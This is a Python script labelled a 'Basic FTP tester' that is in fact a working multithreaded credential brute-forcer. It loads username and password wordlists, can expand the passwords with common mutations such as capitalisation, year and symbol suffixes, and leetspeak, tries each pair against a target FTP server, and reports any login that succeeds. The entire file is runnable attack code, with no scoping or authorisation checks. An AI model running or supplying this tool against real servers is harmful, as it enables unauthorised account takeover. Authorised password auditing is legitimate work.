import ftplib
import argparse
import threading
from queue import Queue

combo_queue = Queue()
result_lock = threading.Lock()
stop_event = threading.Event()

parser = argparse.ArgumentParser(description="Basic FTP tester")

parser.add_argument("-ho", "--host", required=True, type=str, help="Enter the target to test ftp")
parser.add_argument("-p", "--passfile", required=True, type=str, help="Enter the path of file containing password list")
parser.add_argument("-t", "--threads", type=int, default=20, help="enter the number of threads. Default : 20")
parser.add_argument("-u", "--user", required=True, type=str, help="enter the path of file containing usernames")
parser.add_argument("-m", "--mutate", action="store_true", help="Enable this Flag if you want to mutate the wordlists")
args = parser.parse_args()

host = args.host
user_file = args.user
passfile = args.passfile
thread_count = args.threads  # Changed variable name to avoid conflict
mutant = args.mutate

def smart_mutate(base_word):
    leet_map = {'a': '@', 'i': '1', 'e': '3', 'o': '0', 's': '$'}

    mutations = set()

    # Basic variations
    mutations.add(base_word)
    mutations.add(base_word.capitalize())
    mutations.add(base_word.upper())

    # Common suffixes
    suffixes = ["123", "!", "2024", "@"]
    for word in list(mutations):
        for suffix in suffixes:
            mutations.add(word + suffix)

    # Leetspeak (simple version)
    for word in list(mutations):
        for orig, repl in leet_map.items():
            if orig in word:
                mutations.add(word.replace(orig, repl))

    return mutations

def read_file(filename):
    with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
        return [line.strip() for line in f if line.strip()]

# Read users and passwords
users = read_file(user_file)
passwords = read_file(passfile)

# Populate queue
if mutant:
    for user in users:
        for base_password in passwords:
            for mutated_password in smart_mutate(base_password):
                combo_queue.put((user, mutated_password))
else:
    for user in users:
        for password in passwords:
            combo_queue.put((user, password))

def worker():
    global trueuser, truepasswd
    while not stop_event.is_set() and not combo_queue.empty():
        try:
            user, password = combo_queue.get(timeout=1)
            
            try:
                with ftplib.FTP() as ftp:
                    ftp.connect(host, 21, timeout=5)
                    ftp.login(user, password)
                    
                    with result_lock:
                        print("\n" + "="*80)
                        print("[+] SUCCESS! Valid credentials found:")
                        print(f"    Host: {host}")
                        print(f"    User: {user}")
                        print(f"    Password: {password}")
                        print("="*80)
                        
                        trueuser = user
                        truepasswd = password
                        stop_event.set()
            except ftplib.error_perm as e:
                print(f"[-] Failed: {user}:{password} - {str(e)}")
            except Exception as e:
                print(f"[!] Error with {user}:{password} - {str(e)}")
            
            combo_queue.task_done()
        except:
            break

# Start threads
thread_list = []  # Changed variable name to avoid conflict
for _ in range(thread_count):
    t = threading.Thread(target=worker)
    t.start()
    thread_list.append(t)

# Wait for completion
for t in thread_list:
    t.join()

print("\n" + "="*80)
if 'trueuser' in globals() and 'truepasswd' in globals() and trueuser and truepasswd:
    print(f"[+] Found valid credentials: {trueuser}:{truepasswd}")
else:
    print("[-] No valid credentials found")
print("="*80)